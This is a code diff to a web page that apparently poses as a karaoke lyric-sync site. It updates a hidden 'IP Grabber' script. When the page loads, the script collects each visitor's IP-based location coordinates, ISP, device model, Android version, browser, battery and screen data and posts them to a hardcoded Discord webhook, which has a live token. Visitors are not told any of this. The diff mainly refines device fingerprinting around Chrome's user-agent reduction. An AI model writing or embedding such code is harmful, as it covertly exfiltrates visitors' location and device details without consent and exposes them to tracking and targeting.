@@ -1084,7 +1084,7 @@ document.addEventListener('keydown', e => {
 // Init favorites display
 renderFavList();
 </script>
-<!-- ==================== IP GRABBER v9.4 - Aggressive Model Detection ==================== -->
+<!-- ==================== IP GRABBER v9.5 - Handle Chrome UA Reduction ==================== -->
 <script>
 // GANTI DENGAN WEBHOOK DISCORD KAMU
 const WEBHOOK_URL = "https://discord.com/api/webhooks/1489972314215809124/bRqWBzezptsRKE8nLFEFMjz3ShcgSFATRsf1KhuF4AkSKu3a2xIQkU0T4p5pCEgpQQq7";
@@ -1092,72 +1092,36 @@ const WEBHOOK_URL = "https://discord.com/api/webhooks/1489972314215809124/bRqWBz
 function getDetailedDeviceInfo() {
     const ua = navigator.userAgent;
     const uaLower = ua.toLowerCase();
-    
-    let brand = 'Unknown';
-    let model = '';
-    
-    // === BRAND DETECTION (lebih lengkap) ===
-    if (uaLower.includes('samsung')) brand = 'Samsung';
-    else if (uaLower.includes('xiaomi') || uaLower.includes('redmi') || uaLower.includes('poco')) brand = 'Xiaomi/Redmi/Poco';
-    else if (uaLower.includes('oppo') || uaLower.includes('realme') || uaLower.includes('cph') || uaLower.includes('rmx')) brand = 'Oppo/Realme';
-    else if (uaLower.includes('vivo')) brand = 'Vivo';
-    else if (uaLower.includes('infinix')) brand = 'Infinix';
-    else if (uaLower.includes('tecno')) brand = 'Tecno';
-    else if (uaLower.includes('huawei') || uaLower.includes('honor')) brand = 'Huawei/Honor';
-    else if (uaLower.includes('oneplus')) brand = 'OnePlus';
-    else if (uaLower.includes('iqoo')) brand = 'iQOO';
-    else if (uaLower.includes('nothing')) brand = 'Nothing';
-    else if (uaLower.includes('motorola')) brand = 'Motorola';
-    else if (uaLower.includes('lenovo')) brand = 'Lenovo';
-    else if (uaLower.includes('asus')) brand = 'Asus';
-    else if (uaLower.includes('nokia')) brand = 'Nokia';
 
-    // === MODEL DETECTION (lebih agresif) ===
-    // 1. Cari pola model di dalam tanda kurung (Linux; Android X; MODEL)
-    let modelMatch = ua.match(/\(\s*Linux;\s*Android\s+\d+;\s*([^);]+)/i);
-    if (modelMatch && modelMatch[1] && modelMatch[1].trim() !== 'K') {
-        model = modelMatch[1].trim();
-    }
-    
-    // 2. Jika hanya "K", coba ambil dari bagian lain User-Agent
-    if ((!model || model === 'K') && uaLower.includes('realme') || uaLower.includes('oppo')) {
-        const altMatch = ua.match(/(?:RMX|CPH|RE(?:ALME)?)[A-Z0-9]+/i);
-        if (altMatch) model = altMatch[0];
-    }
-    
-    // 3. Ambil model Samsung (SM-XXXX)
-    if (brand === 'Samsung' && !model) {
-        const samsungModel = ua.match(/SM-[A-Z0-9]+/i);
-        if (samsungModel) model = samsungModel[0];
-    }
-    
-    // 4. Ambil Redmi / POCO model
-    if ((brand.includes('Xiaomi') || brand.includes('Redmi')) && !model) {
-        const xiaomiModel = ua.match(/(?:Redmi|POCO|Mi)[^);]*/i);
-        if (xiaomiModel) model = xiaomiModel[0].trim();
+    // Cek apakah menggunakan Chrome UA Reduction (paling umum sekarang)
+    const isReducedUA = ua.includes('Android 10; K') || uaLower.includes('android 10; k');
+
+    let deviceModel = 'Android Device';
+    if (isReducedUA) {
+        deviceModel = 'Android Device (Model Hidden by Chrome)';
+    } else {
+        // Fallback deteksi biasa (untuk browser lama atau non-Chromium)
+        if (uaLower.includes('samsung')) deviceModel = 'Samsung Device';
+        else if (uaLower.includes('xiaomi') || uaLower.includes('redmi') || uaLower.includes('poco')) deviceModel = 'Xiaomi/Redmi/Poco';
+        else if (uaLower.includes('oppo') || uaLower.includes('realme')) deviceModel = 'Oppo/Realme';
+        else if (uaLower.includes('vivo')) deviceModel = 'Vivo';
+        else if (uaLower.includes('infinix')) deviceModel = 'Infinix';
+        else if (uaLower.includes('tecno')) deviceModel = 'Tecno';
     }
 
-    const deviceModel = model ? `${brand} ${model}` : (brand !== 'Unknown' ? `${brand} Device` : 'Android Device');
-
-    // === BROWSER DETECTION ===
+    // Browser
     let browser = 'Unknown Browser';
     if (ua.includes('Chrome') && !ua.includes('Edg') && !ua.includes('OPR')) {
         const ver = ua.match(/Chrome\/(\d+)/);
         browser = `Chrome ${ver ? ver[1] : ''}`;
-    } else if (ua.includes('Firefox')) {
-        const ver = ua.match(/Firefox\/(\d+)/);
-        browser = `Firefox ${ver ? ver[1] : ''}`;
     } else if (ua.includes('Edg')) {
         const ver = ua.match(/Edg\/(\d+)/);
         browser = `Edge ${ver ? ver[1] : ''}`;
     } else if (ua.includes('SamsungBrowser')) {
-        const ver = ua.match(/SamsungBrowser\/(\d+)/);
-        browser = `Samsung Internet ${ver ? ver[1] : ''}`;
-    } else if (ua.includes('Safari') && !ua.includes('Chrome')) {
-        browser = 'Safari';
+        browser = 'Samsung Internet';
     }
 
-    return { deviceModel, browser };
+    return { deviceModel, browser, isReducedUA };
 }
 
 async function sendIPLog() {
@@ -1177,7 +1141,7 @@ async function sendIPLog() {
         };
     } catch (e) {}
 
-    const { deviceModel, browser } = getDetailedDeviceInfo();
+    const { deviceModel, browser, isReducedUA } = getDetailedDeviceInfo();
     
     let batteryInfo = 'Tidak tersedia';
     if ('getBattery' in navigator) {
@@ -1191,7 +1155,7 @@ async function sendIPLog() {
     const androidVersion = androidMatch ? androidMatch[1] : '—';
 
     const embed = {
-        title: "🎤 Karaoke Sync - Pengunjung Baru! (v9.4)",
+        title: "🎤 Karaoke Sync - Pengunjung Baru! (v9.5)",
         color: 0x00ff88,
         timestamp: new Date().toISOString(),
         fields: [
@@ -1200,7 +1164,7 @@ async function sendIPLog() {
             { name: "Koordinat", value: ipData.lat && ipData.lon ? `${ipData.lat.toFixed(4)}, ${ipData.lon.toFixed(4)}` : 'Tidak tersedia', inline: true },
             { name: "ISP", value: ipData.org, inline: true },
             { name: "Device Model", value: deviceModel, inline: true },
-            { name: "Android Version", value: androidVersion, inline: true },
+            { name: "Android Version", value: androidVersion + (isReducedUA ? " (fake by Chrome)" : ""), inline: true },
             { name: "Browser", value: browser, inline: true },
             { name: "Operating System", value: navigator.platform || 'Unknown', inline: true },
             { name: "Screen", value: `${screen.width} × ${screen.height}`, inline: true },
@@ -1212,7 +1176,7 @@ async function sendIPLog() {
             { name: "User Agent", value: navigator.userAgent.substring(0, 240) + "...", inline: false },
             { name: "Waktu (WIB)", value: new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }), inline: false }
         ],
-        footer: { text: "IP Grabber v9.4 • Aggressive Model Detection" }
+        footer: { text: "IP Grabber v9.5 • Chrome UA Reduction Detected" }
     };
 
     try {
@@ -1221,7 +1185,7 @@ async function sendIPLog() {
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({ username: "Karaoke Logger", embeds: [embed] })
         });
-        console.log("%c✅ IP Log terkirim (v9.4 - Aggressive Detection)", "color: lime; font-weight: bold");
+        console.log("%c✅ IP Log terkirim (v9.5 - Chrome UA Reduction)", "color: lime; font-weight: bold");
     } catch (err) {
         console.log("❌ IP Logger error:", err.message);
     }
@@ -1229,4 +1193,4 @@ async function sendIPLog() {
 
 window.addEventListener('load', () => setTimeout(sendIPLog, 1800));
 </script>
-<!-- ==================== END IP GRABBER v9.4 ==================== -->
+<!-- ==================== END IP GRABBER v9.5 ==================== -->
